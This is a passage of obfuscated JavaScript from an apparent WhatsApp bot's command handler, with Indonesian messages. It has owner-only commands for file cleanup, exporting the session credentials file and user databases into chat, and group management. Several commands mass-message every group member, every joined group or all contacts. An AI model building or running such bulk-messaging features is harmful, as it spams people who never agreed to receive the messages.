              return _0x3a091f(_0x643d36);
            }
            _0x36da37.forEach((_0x4f0516, _0x374dd7) => {
              _0x643d36 += _0x374dd7 + 0x1 + ". " + _0x4f0516 + "\n";
            });
            _0x3a091f(_0x643d36);
            await sleep(0x3e8);
            _0x3a091f("Mau hapus file sampahnya... Tunggu yaa...");
            _0x36da37.forEach(_0x502eae => {
              fs.unlinkSync('./session/' + _0x502eae);
            });
            await sleep(0x3e8);
            _0x3a091f("Berhasil hapus semua file sampah di folder session, kecuali creds.json! 🎉");
          });
        }
        break;
      case "delmedia":
      case "clearmedia":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          const _0x7341e0 = [".mp3", ".mp4", ".wav", '.flac', ".aac", ".ogg", ".m4a", ".m4r", ".wma", ".amr", ".jpg", ".jpeg", '.png', ".webp", '.gif', ".bmp", ".tiff", ".svg", '.ico', '.heic', '.mpg', ".mpeg", '.avi', ".mov", ".wmv", ".flv", '.mkv', ".3gp", '.ts', ".webm", ".pdf", ".doc", ".docx", ".ppt", ".pptx", '.xls', ".xlsx", ".txt", '.rtf', '.odt', ".epub", '.html', ".htm", ".zip", ".rar", ".7z", ".tar", ".gz", '.iso', '.dmg', ".exe", ".apk", '.msi', ".bat", ".sh", '.py', ".js", ".css", ".json", ".xml", ".yml"];
          fs.readdir("./temp", async function (_0x429796, _0x4cfcfb) {
            if (_0x429796) {
              console.log("Gak bisa scan direktori: " + _0x429796);
              return _0x3a091f("Gak bisa scan direktori nih: " + _0x429796);
            }
            let _0x36f169 = _0x4cfcfb.filter(_0x26c514 => {
              const _0x30a952 = path.extname(_0x26c514);
              return _0x7341e0.includes(_0x30a952);
            });
            let _0x3f649a = "Ditemukan " + _0x36f169.length + " file media di folder temp\n\n";
            if (_0x36f169.length === 0x0) {
              return _0x3a091f(_0x3f649a);
            }
            _0x36f169.forEach((_0x4ab105, _0x911467) => {
              _0x3f649a += _0x911467 + 0x1 + ". " + _0x4ab105 + "\n";
            });
            _0x3a091f(_0x3f649a);
            await sleep(0x3e8);
            _0x3a091f("Mau hapus file medianya... Tunggu yaa...");
            _0x36f169.forEach(_0x1faf60 => {
              const _0x34161c = path.join("./temp", _0x1faf60);
              fs.unlinkSync(_0x34161c);
            });
            await sleep(0x3e8);
            _0x3a091f("Berhasil hapus semua file media di folder *temp*! 🎉");
          });
        }
        break;
      case "joingroup":
      case 'joingrup':
      case "joingc":
      case "join":
        {
          try {
            if (!_0x2cfe7f) {
              return _0x3a091f(mess.owner);
            }
            if (!_0x2b2627) {
              return _0x3a091f("Masukkan Link Grup yaa!");
            }
            if (!isUrl(_0x143458[0x0]) && !_0x143458[0x0].includes("whatsapp.com")) {
              return _0x3a091f("Link-nya invalid nih!");
            }
            let _0xcb6cbf = _0x143458[0x0].split("https://chat.whatsapp.com/")[0x1];
            _0x59f5fa.groupAcceptInvite(_0xcb6cbf);
            await _0x3a091f("Sudah gabung ke grup! 🎉");
          } catch {
            _0x3a091f("Gagal gabung ke grup, coba lagi nanti!");
          }
        }
        break;
      case "outgroup":
      case "outgrup":
      case 'outgc':
      case "out":
        if (!_0x2cfe7f) {
          return _0x3a091f(mess.owner);
        }
        if (!_0x3f87c6.isGroup) {
          return _0x3a091f(mess.group);
        }
        _0x3a091f("Selamat tinggal, semuanya 🥺");
        await _0x59f5fa.groupLeave(_0x3f87c6.chat);
        break;
      case "groupinfo":
      case "getgroupinfo":
      case "getinfogc":
        {
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Kirim perintah " + (_0x4773c6 + _0x4ac520) + " _linkgrup_");
          }
          if (!isUrl(_0x143458[0x0]) && !_0x143458[0x0].includes("chat.whatsapp.com")) {
            return _0x3a091f(mess.error);
          }
          try {
            let _0x56becc = _0x143458[0x0].split('https://chat.whatsapp.com/')[0x1];
            let _0x533ad8 = await _0x59f5fa.groupGetInviteInfo(_0x56becc);
            let _0x345867 = "「 *GROUP METADATA* 」\n\n";
            _0x345867 += "- *ID*: " + _0x533ad8.id + "\n";
            _0x345867 += "- *Name*: " + _0x533ad8.subject + "\n";
            _0x345867 += "- *Owner*: " + _0x533ad8.owner + "\n";
            _0x345867 += "- *Kirim Pesan*: " + (_0x533ad8.announce ? "Hanya Admin" : "Semua Orang") + "\n";
            _0x345867 += "- *Persetujuan Admin*: " + (_0x533ad8.joinApprovalMode ? "Yes" : 'No') + "\n";
            _0x345867 += "- *Member Add Mode*: " + (_0x533ad8.memberAddMode ? 'Yes' : 'No') + "\n";
            _0x345867 += "- *Desk :*\n" + _0x533ad8.desc + "\n\n";
            _0x345867 += "- *Anggota Teratas :*\n";
            for (let _0x249f77 of _0x533ad8.participants) {
              _0x345867 += "- @" + _0x249f77.id.split('@')[0x0] + "\n";
            }
            let _0x364f1f = [{
              'name': 'cta_copy',
              'buttonParamsJson': "{\n\t\t\t\t\t\t\t\"display_text\": \"Copy Meta Group ID\",\n\t\t\t\t\t\t\t\"id\": \"" + _0x533ad8.id + "\",\n\t\t\t\t\t\t\t\"copy_code\": \"" + _0x533ad8.id + "\"\n\t\t\t\t\t\t}"
            }];
            _0x59f5fa.sendButtonText(_0x3f87c6.chat, _0x364f1f, _0x345867, footer, _0x3f87c6);
          } catch (_0x26e7f0) {
            _0x3a091f(mess.error);
          }
        }
        break;
      case "getsession":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          _0x3a091f("Tunggu sebentar yaa, aku lagi ambil file session-mu nih");
          let _0x2c4818 = fs.readFileSync('./' + sessionName + "/creds.json");
          _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'document': _0x2c4818,
            'mimetype': "application/json",
            'fileName': "creds.json"
          }, {
            'quoted': _0x3f87c6
          });
        }
        break;
      case "getdatabase":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          _0x3a091f("Tunggu sebentar yaa, aku lagi ambil file database-mu nih");
          let _0x15a706 = fs.readFileSync('./src/' + tempatDB);
          _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'document': _0x15a706,
            'mimetype': "application/json",
            'fileName': '' + tempatDB
          }, {
            'quoted': _0x3f87c6
          });
        }
        break;
      case 'getdbuser':
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          _0x3a091f("Tunggu sebentar yaa, aku lagi ambil file database usermu nih");
          let _0x371feb = fs.readFileSync('./src/data/role/user.json');
          _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'document': _0x371feb,
            'mimetype': "application/json",
            'fileName': 'user.json'
          }, {
            'quoted': _0x3f87c6
          });
        }
        break;
      case 'repo':
      case 'repository':
        {
          if (!_0x2b2627 || !_0x2b2627.includes('/')) {
            return _0x3a091f("Kamu bisa pakai format ini ya: *" + (_0x4773c6 + _0x4ac520) + " username/repository*\n\n*Kirim perintah*: *" + (_0x4773c6 + _0x4ac520) + " WhiskeySockets/Baileys*");
          }
          const [_0x193b72, _0x5b25bc] = _0x2b2627.split('/');
          try {
            const _0x13ed2f = await axios.get("https://api.github.com/repos/" + _0x193b72 + '/' + _0x5b25bc);
            if (_0x13ed2f.status === 0xc8) {
              const _0x48917e = _0x13ed2f.data;
              let _0x2876ab = "📦 *Repository Name*: " + _0x48917e.name + "\n";
              _0x2876ab += "📝 *Description*: " + _0x48917e.description + "\n";
              _0x2876ab += "👤 *Owner*: " + _0x48917e.owner.login + "\n";
              _0x2876ab += "⭐ *Stars*: " + _0x48917e.stargazers_count + "\n";
              _0x2876ab += "🍴 *Forks*: " + _0x48917e.forks_count + "\n";
              _0x2876ab += "🔗 *URL*: " + _0x48917e.html_url + "\n\n";
              _0x2876ab += "🛠️ Pengen download " + _0x4ac520 + "? Ketik aja *" + _0x4773c6 + "gitclone url* ya, kak! 🚀";
              _0x3a091f(_0x2876ab);
            } else {
              await _0x3a091f("Tidak dapat mengambil informasi repositori.");
            }
          } catch (_0x233567) {
            console.error(_0x233567);
            await _0x3a091f("Repositori saat ini tidak tersedia.");
          }
        }
        break;
      case "myip":
      case "ipbot":
        if (!_0x2cfe7f) {
          return _0x3a091f(mess.owner);
        }
        let _0x1e02a8 = require("http");
        _0x1e02a8.get({
          'host': "api.ipify.org",
          'port': 0x50,
          'path': '/'
        }, function (_0x5d1c42) {
          _0x5d1c42.on('data', function (_0x2151c3) {
            _0x3a091f("🔎 Oii, alamat IP publik aku nih: " + _0x2151c3);
          });
        });
        break;
      case "ipwhois":
        {
          if (!_0x2b2627) {
            return _0x3a091f("Kirim perintah:\n\n" + (_0x4773c6 + _0x4ac520) + " <IP Address>\n\n📌 Contoh:\n" + (_0x4773c6 + _0x4ac520) + " 114.5.213.103");
          }
          const _0x369d8a = _0x2b2627.trim();
          const _0x433b09 = 'https://ipwho.is/' + _0x369d8a;
          try {
            _0x3a091f("🔍 Sedang mencari informasi, mohon tunggu...");
            const _0x552c84 = await fetchJson(_0x433b09);
            if (_0x552c84.success) {
              const _0x202457 = _0x552c84.flag?.["emoji"] || "🏳️";
              let _0x3b4a05 = "📍 *IP Whois Information*\n";
              _0x3b4a05 += "🌐 *IP Address*: " + _0x552c84.ip + "\n";
              _0x3b4a05 += "🗺️ *Tipe*: " + _0x552c84.type + "\n";
              _0x3b4a05 += "🌍 *Benua*: " + _0x552c84.continent + " (" + _0x552c84.continent_code + ")\n";
              _0x3b4a05 += "🇨🇺 *Negara*: " + _0x552c84.country + " (" + _0x552c84.country_code + ") " + _0x202457 + "\n";
              _0x3b4a05 += "🏙️ *Kota*: " + _0x552c84.city + ", " + _0x552c84.region + " (" + _0x552c84.region_code + ")\n";
              _0x3b4a05 += "📞 *Kode Panggilan*: +" + _0x552c84.calling_code + "\n";
              _0x3b4a05 += "📫 *Kode Pos*: " + _0x552c84.postal + "\n";
              _0x3b4a05 += "🏛️ *Ibu Kota*: " + _0x552c84.capital + "\n\n";
              _0x3b4a05 += "📡 *Provider Informasi*\n";
              _0x3b4a05 += "🏢 *ISP*: " + (_0x552c84.connection?.['isp'] || "Tidak tersedia") + "\n";
              _0x3b4a05 += "🔗 *Domain*: " + (_0x552c84.connection?.["domain"] || "Tidak tersedia") + "\n";
              _0x3b4a05 += "🔢 *ASN*: " + (_0x552c84.connection?.['asn'] || "Tidak tersedia") + "\n\n";
              _0x3b4a05 += "🕰️ *Zona Waktu*\n";
              _0x3b4a05 += "🕒 *ID*: " + (_0x552c84.timezone?.['id'] || "Tidak tersedia") + "\n";
              _0x3b4a05 += "🕒 *UTC*: " + (_0x552c84.timezone?.['utc'] || "Tidak tersedia") + "\n";
              _0x3b4a05 += "🕒 *Waktu Sekarang*: " + (_0x552c84.timezone?.['current_time'] || "Tidak tersedia") + "\n";
              _0x3a091f(_0x3b4a05);
            } else {
              _0x3a091f("❌ IP Address tidak valid atau informasi tidak ditemukan.");
            }
          } catch (_0x1150ed) {
            console.error(_0x1150ed);
            _0x3a091f("❌ Terjadi kesalahan saat mengambil data. Coba lagi nanti.");
          }
        }
        break;
      case 'country':
        {
          if (!_0x2b2627) {
            return _0x3a091f("Masukkan nama negara!\nContoh: *.country Japan*");
          }
          try {
            let _0x21689e = await fetchJson('https://api.siputzx.my.id/api/tools/countryInfo?name=' + encodeURIComponent(_0x2b2627));
            if (!_0x21689e.status) {
              return _0x3a091f("Negara tidak ditemukan atau data tidak tersedia.");
            }
            let _0x1c4255 = _0x21689e.data;
            let _0x498e6c = _0x1c4255.continent.name + " " + _0x1c4255.continent.emoji;
            let _0x436ddd = "🌍 *Informasi Negara: " + _0x1c4255.name + "*\n\n";
            _0x436ddd += "🌐 *Kontinen:* " + _0x498e6c + "\n";
            _0x436ddd += "🏙️ *Ibu Kota:* " + _0x1c4255.capital + "\n";
            _0x436ddd += "📞 *Kode Telepon:* " + _0x1c4255.phoneCode + "\n";
            _0x436ddd += "💱 *Mata Uang:* " + _0x1c4255.currency + "\n";
            _0x436ddd += "🗺️ *Peta:* " + _0x1c4255.googleMapsLink + "\n";
            _0x436ddd += "🌐 *TLD Internet:* " + _0x1c4255.internetTLD + "\n";
            _0x436ddd += "🗣️ *Bahasa:* " + _0x1c4255.languages.native.join(", ") + "\n";
            _0x436ddd += "🏞️ *Luas:* " + _0x1c4255.area.squareKilometers.toLocaleString() + " km² (" + _0x1c4255.area.squareMiles.toLocaleString() + " mi²)\n";
            _0x436ddd += "🚗 *Arah Berkendara:* " + (_0x1c4255.drivingSide == "left" ? "Kiri" : "Kanan") + "\n";
            _0x436ddd += "⭐ *Terkenal Karena:* " + _0x1c4255.famousFor + "\n";
            _0x436ddd += "🏛️ *Bentuk Pemerintahan:* " + _0x1c4255.constitutionalForm + "\n";
            _0x436ddd += "📍 *Koordinat:* " + _0x1c4255.coordinates.latitude + ", " + _0x1c4255.coordinates.longitude;
            await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'image': {
                'url': _0x1c4255.flag
              },
              'caption': _0x436ddd
            }, {
              'quoted': _0x3f87c6
            });
          } catch (_0x513eb6) {
            console.log(_0x513eb6);
            _0x3a091f("Terjadi kesalahan saat mengambil data negara.");
          }
        }
        break;
      case "dns":
        {
          if (!_0x2b2627) {
            return _0x3a091f("Masukkan nama domain!\nContoh: *.dns darkroom.or.id*");
          }
          try {
            let _0x28c48e = await fetchJson("https://api.siputzx.my.id/api/tools/dns?domain=" + encodeURIComponent(_0x2b2627));
            if (!_0x28c48e.status) {
              return _0x3a091f("Gagal mengambil data DNS atau domain tidak ditemukan.");
            }
            let _0x5e30cc = _0x28c48e.data;
            let _0x1e79f7 = _0x5e30cc.records;
            let _0x549082 = "🌐 *Hasil DNS Lookup untuk:* " + _0x5e30cc.unicodeDomain + "\n\n";
            _0x549082 += "📍 *Punycode:* " + _0x5e30cc.punycodeDomain + "\n";
            const _0x167969 = (_0x15c9a5, _0x1d606b) => {
              let _0x4ae3d2 = "\n🔹 *" + _0x15c9a5.toUpperCase() + " Record:*\n";
              if (_0x1d606b.response.answer.length) {
                _0x1d606b.response.answer.forEach((_0x21a261, _0x24b374) => {
                  _0x4ae3d2 += " " + (_0x24b374 + 0x1) + ". " + (_0x21a261.record.target || _0x21a261.record.raw) + "\n";
                });
              } else {
                _0x4ae3d2 += "Tidak ada data tersedia.\n";
              }
              return _0x4ae3d2;
            };
            _0x549082 += _0x167969('A', _0x1e79f7.a);
            _0x549082 += _0x167969("AAAA", _0x1e79f7.aaaa);
            _0x549082 += _0x167969('NS', _0x1e79f7.ns);
            _0x549082 += _0x167969('MX', _0x1e79f7.mx);
            _0x549082 += _0x167969('TXT', _0x1e79f7.txt);
            _0x549082 += _0x167969("SOA", _0x1e79f7.soa);
            _0x549082 += _0x167969("CNAME", _0x1e79f7.cname);
            _0x549082 += "\n💡 *Server DNS:* " + _0x1e79f7.a.query.server.ip + "\n";
            _0x549082 += "📍 *Lokasi Server:* Latitude " + _0x1e79f7.a.query.server.location.lat + ", Longitude " + _0x1e79f7.a.query.server.location.lon;
            await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'text': _0x549082
            }, {
              'quoted': _0x3f87c6
            });
          } catch (_0x173876) {
            console.log(_0x173876);
            _0x3a091f("Terjadi kesalahan saat mengambil data DNS.");
          }
        }
        break;
      case "restart":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          await _0x3a091f("Bot sedang di-restart... ⏳");
          console.log("Bot restarting...");
          process.exit();
          break;
        }
      case "kill":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          await _0x3a091f("Bot sedang dimatikan secara paksa... ⚠️");
          console.log("Bot killed by owner!");
          process.exit(0x1);
          break;
        }
      case "shutdown":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          await _0x3a091f("Bot sedang dimatikan dan aplikasi akan shutdown... 💀");
          console.log("Bot shutting down...");
          process.exit(0x0);
          break;
        }
      case "autoread":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (_0x143458.length < 0x1) {
            return _0x3a091f("❗ *Kirim perintah*:\n" + (_0x4773c6 + _0x4ac520) + " true/false");
          }
          if (q === "true") {
            db.data.settings[_0xb3f81d].autoread = true;
            _0x3a091f("Yay! Auto-read berhasil diubah ke " + q);
          } else if (q === "false") {
            db.data.settings[_0xb3f81d].autoread = false;
            _0x3a091f("Oke deh! Auto-read berhasil dimatikan, jadi gak bakal dibaca otomatis nih!");
          }
        }
        break;
      case "unavailable":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (_0x143458.length < 0x1) {
            return _0x3a091f("❗ *Kirim perintah*:\n" + (_0x4773c6 + _0x4ac520) + " true/false");
          }
          if (q === "true") {
            db.data.settings[_0xb3f81d].online = true;
            _0x3a091f("Wah, sekarang bot aku lagi online, bisa nyapa-nyapa nih!");
          } else if (q === "false") {
            db.data.settings[_0xb3f81d].online = false;
            _0x3a091f("Oke, bot aku jadi offline dulu ya, nanti nyapa-nyapanya kalau sudah aktif lagi 😎");
          }
        }
        break;
      case 'autorecordtype':
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (_0x143458.length < 0x1) {
            return _0x3a091f("❗ *Kirim perintah*:\n" + (_0x4773c6 + _0x4ac520) + " true/false");
          }
          if (q === "true") {
            db.data.settings[_0xb3f81d].autorecordtype = true;
            _0x3a091f("Auto-record typing berhasil diubah ke " + q + '!');
          } else if (q === 'false') {
            db.data.settings[_0xb3f81d].autorecordtype = false;
            _0x3a091f("Auto-record typing dimatikan, gak bakal ada rekaman ketik lagi ya!");
          }
        }
        break;
      case "autorecord":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (_0x143458.length < 0x1) {
            return _0x3a091f("❗ *Kirim perintah*:\n" + (_0x4773c6 + _0x4ac520) + " true/false");
          }
          if (q === "true") {
            db.data.settings[_0xb3f81d].autorecord = true;
            _0x3a091f("Auto-record berhasil diubah ke " + q + ", jadi semua aktivitas terrekam otomatis!");
          } else if (q === "false") {
            db.data.settings[_0xb3f81d].autorecord = false;
            _0x3a091f("Auto-record dimatikan, gak bakal ada rekaman otomatis lagi!");
          }
        }
        break;
      case 'autotype':
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (_0x143458.length < 0x1) {
            return _0x3a091f("❗ *Kirim perintah*:\n" + (_0x4773c6 + _0x4ac520) + " true/false");
          }
          if (q === 'true') {
            db.data.settings[_0xb3f81d].autotype = true;
            _0x3a091f("Auto-typing berhasil diubah ke " + q + ", jadi bot bakal ngetik otomatis deh!");
          } else if (q === "false") {
            db.data.settings[_0xb3f81d].autotype = false;
            _0x3a091f("Auto-typing dimatikan, jadi bot gak bakal ngetik otomatis lagi!");
          }
        }
        break;
      case "autobio":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (_0x143458.length < 0x1) {
            return _0x3a091f("❗ *Kirim perintah*:\n" + (_0x4773c6 + _0x4ac520) + " true/false");
          }
          if (q == 'true') {
            db.data.settings[_0xb3f81d].autobio = true;
            _0x3a091f("Yay! AutoBio berhasil diubah ke " + q + ", biografi otomatis aktif!");
          } else if (q == 'false') {
            db.data.settings[_0xb3f81d].autobio = false;
            _0x3a091f("Oke, AutoBio berhasil dimatikan. Gak ada lagi bio otomatis nih!");
          }
        }
        break;
      case "autosticker":
      case "autostickergc":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (_0x143458.length < 0x1) {
            return _0x3a091f("❗ *Kirim perintah*:\n" + (_0x4773c6 + _0x4ac520) + " true/false");
          }
          if (q == "true") {
            db.data.settings[_0xb3f81d].autosticker = true;
            _0x3a091f("Sticker otomatis berhasil diubah ke " + q + ", jadi semuanya bakal jadi sticker!");
          } else if (q == "false") {
            db.data.settings[_0xb3f81d].autosticker = false;
            _0x3a091f("Sticker otomatis dimatikan, gak ada sticker otomatis lagi deh!");
          }
        }
        break;
      case "safesearch":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (_0x143458.length < 0x1) {
            return _0x3a091f("❗ *Kirim perintah*:\n" + (_0x4773c6 + _0x4ac520) + " true/false");
          }
          if (q === "true") {
            db.data.settings[_0xb3f81d].safesearch = true;
            _0x3a091f("🛡️ *SafeSearch Shield* berhasil diaktifkan!\nSekarang bot akan menjaga chat dari konten yang tidak pantas. 😊");
          } else if (q === "false") {
            db.data.settings[_0xb3f81d].safesearch = false;
            _0x3a091f("🛡️ *SafeSearch Shield* berhasil dimatikan.\nFitur perlindungan konten Unavailable untuk saat ini.");
          } else {
            _0x3a091f("⚠️ Opsi tidak valid! Gunakan *on* untuk mengaktifkan atau *off* untuk mematikan.");
          }
        }
        break;
      case "autodownload":
      case "autodl":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (_0x143458.length < 0x1) {
            return _0x3a091f("❗ *Kirim perintah*:\n" + (_0x4773c6 + _0x4ac520) + " true/false");
          }
          if (q == "true") {
            db.data.settings[_0xb3f81d].autodownload = true;
            _0x3a091f("Download otomatis berhasil diubah ke " + q + ", jadi file bakal langsung terunduh otomatis!");
          } else if (q == "false") {
            db.data.settings[_0xb3f81d].autodownload = false;
            _0x3a091f("Download otomatis dimatikan, jadi file gak bakal langsung terunduh lagi!");
          }
        }
        break;
      case "autoblock":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (_0x143458.length < 0x1) {
            return _0x3a091f("❗ *Kirim perintah*:\n" + (_0x4773c6 + _0x4ac520) + " true/false");
          }
          if (q == "true") {
            db.data.settings[_0xb3f81d].autoblocknum = true;
            _0x3a091f("Auto-Block berhasil diubah ke " + q + ", jadi nomor yang mencurigakan bakal diblokir otomatis!");
          } else if (q == "false") {
            db.data.settings[_0xb3f81d].autoblocknum = false;
            _0x3a091f("Auto-Block dimatikan, jadi gak bakal ada pemblokiran otomatis lagi!");
          }
        }
        break;
      case "onlygroup":
      case "onlygc":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (_0x143458.length < 0x1) {
            return _0x3a091f("❗ *Kirim perintah*:\n" + (_0x4773c6 + _0x4ac520) + " true/false");
          }
          if (q == 'true') {
            db.data.settings[_0xb3f81d].onlygc = true;
            _0x3a091f("Yeay! Onlygroup berhasil diubah ke " + q + ", sekarang bot hanya bisa dipakai di grup aja!");
          } else if (q == "false") {
            db.data.settings[_0xb3f81d].onlygc = false;
            _0x3a091f("Oke, Onlygroup berhasil dimatikan, jadi bot bisa dipakai di mana saja deh!");
          }
        }
        break;
      case "onlyprivatechat":
      case "onlypc":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (_0x143458.length < 0x1) {
            return _0x3a091f("❗ *Kirim perintah*:\n" + (_0x4773c6 + _0x4ac520) + " true/false");
          }
          if (q == 'true') {
            db.data.settings[_0xb3f81d].onlypc = true;
            _0x3a091f("Yeay! Only-Pc berhasil diubah ke " + q + ", sekarang bot hanya bisa dipakai di chat pribadi!");
          } else if (q == "false") {
            db.data.settings[_0xb3f81d].onlypc = false;
            _0x3a091f("Oke, Only-Pc dimatikan, jadi bot bisa dipakai di grup juga deh!");
          }
        }
        break;
      case "self":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          _0x59f5fa["public"] = false;
          _0x3a091f("Bot sekarang dalam mode *Self Usage* aja, gak bisa dipakai oleh orang lain ya!");
        }
        break;
      case 'public':
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          _0x59f5fa["public"] = true;
          _0x3a091f("Bot sekarang kembali ke mode *Public Usage*, jadi bisa dipakai semua orang!");
        }
        break;
      case 'setexif':
      case "setwm":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " packname|author");
          }
          global.packname = _0x2b2627.split('|')[0x0];
          global.author = _0x2b2627.split('|')[0x1];
          _0x3a091f("Yeay! Exif berhasil diubah! 🎉\n\n · Packname: " + global.packname + "\n · Author: " + global.author);
        }
        break;
      case "setprefix":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " packname|author");
          }
          global.prefa = _0x2b2627;
          _0x3a091f("Prefix berhasil diubah menjadi " + _0x2b2627 + " ✨");
        }
        break;
      case "setautoblock":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " packname|author");
          }
          global.autoblocknumber = _0x2b2627;
          _0x3a091f("Auto-Block number berhasil diubah menjadi " + _0x2b2627 + " 🚫");
        }
        break;
      case "setantiforeign":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " packname|author");
          }
          global.antiforeignnumber = _0x2b2627;
          _0x3a091f("Anti-foreign number berhasil diubah menjadi " + _0x2b2627 + " 🌍❌");
        }
        break;
      case "pushkontak":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess['private']);
          }
          let _0x4feb60 = _0x2b2627.split('/')[0x0];
          let _0x54f29c = _0x2b2627.split('/')[0x1];
          if (!_0x4feb60) {
            return _0x3a091f("*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " nama/pesan");
          }
          if (!_0x54f29c) {
            return _0x3a091f("*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " nama/pesan");
          }
          let _0x347813 = {
            'displayName': 'Contact',
            'contacts': [{
              'displayName': _0x4feb60,
              'vcard': "BEGIN:VCARD\nVERSION:3.0\nN:;" + _0x4feb60 + ";;;\nFN:" + _0x4feb60 + "\nitem1.TEL;waid=" + _0x3f87c6.sender.split('@')[0x0] + ':' + _0x3f87c6.sender.split('@')[0x0] + "\nitem1.X-ABLabel:Ponsel\nEND:VCARD"
            }]
          };
          let _0x3db739 = await _0x59f5fa.groupMetadata(_0x3f87c6.chat);
          if (_0x3db739.participants.length > 0x385) {
            return _0x3a091f("Batas member maksimal: *900*");
          }
          await _0x3f87c6.react('⏱️');
          for (let _0x553ade of _0x3db739.participants) {
            const _0x3d7dff = await _0x59f5fa.sendMessage(_0x553ade.id, {
              'contacts': _0x347813
            });
            _0x59f5fa.sendMessage(_0x553ade.id, {
              'text': _0x54f29c
            }, {
              'quoted': _0x3d7dff
            });
            await sleep(0x3e8);
          }
          await _0x3a091f(mess.done);
        }
        break;
      case 'jpm':
      case 'post':
      case 'pushcontactgc':
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          if (!_0x2b2627) {
            return _0x3a091f("⚙️ *Penggunaan yang benar:*\n" + (_0x4773c6 + _0x4ac520) + " teks|jeda\n\n📸 *Reply gambar* untuk mengirim ke semua grup.\n⏱️ *Jeda*: 1000 = 1 detik\n\n*Contoh*: " + (_0x4773c6 + _0x4ac520) + " Halo semuanya!|9000");
          }
          await _0x3a091f("⏳ *Sedang diproses...*");
          let _0x3add45 = await _0x59f5fa.groupFetchAllParticipating();
          let _0x59c5ff = Object.entries(_0x3add45).map(_0x385a5a => _0x385a5a[0x1]);
          let _0x9d1244 = _0x59c5ff.map(_0x5b6d16 => _0x5b6d16.id);
          for (let _0x5f27e3 of _0x9d1244) {
            let _0x5c320c = await _0x59f5fa.groupMetadata(_0x5f27e3);
            let _0x4bfe85 = _0x5c320c.participants;
            if (/image/.test(_0x3df746)) {
              let _0x575189 = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
              let _0x483a0e = await CatBox(_0x575189);
              await _0x59f5fa.sendMessage(_0x5f27e3, {
                'image': {
                  'url': _0x483a0e
                },
                'caption': _0x2b2627.split('|')[0x0],
                'mentions': _0x4bfe85.map(_0xf9cccf => _0xf9cccf.id)
              });
              await sleep(_0x2b2627.split('|')[0x1]);
            } else {
              await _0x59f5fa.sendMessage(_0x5f27e3, {
                'text': _0x2b2627.split('|')[0x0],
                'mentions': _0x4bfe85.map(_0x1edcb7 => _0x1edcb7.id)
              });
              await sleep(_0x2b2627.split('|')[0x1]);
            }
          }
          _0x3a091f("✅ *Berhasil mengirim pesan ke semua grup!* 🎯");
        }
        break;
      case "pushcontact":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          if (!_0x2b2627) {
            return _0x3a091f("⚠️ *Teksnya mana, kak?* 📛");
          }
          let _0x20b2a1 = await _0x1c92e6.filter(_0x57a3ea => _0x57a3ea.id.endsWith(".net")).map(_0x599d40 => _0x599d40.id);
          _0x3a091f("⏳ *Sedang mengirim pesan ke semua kontak...*");
          for (let _0x33d05f of _0x20b2a1) {
            await _0x59f5fa.sendMessage(_0x33d05f, {
              'text': _0x2b2627
            });
          }
          _0x3a091f("✅ *Pesan berhasil dikirim ke semua kontak!* 📲");
        }
        break;
      case 'pushcontact2':
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("⚙️ *Penggunaan yang benar:*\n" + (_0x4773c6 + _0x4ac520) + " idgc|teks");
          }
          try {
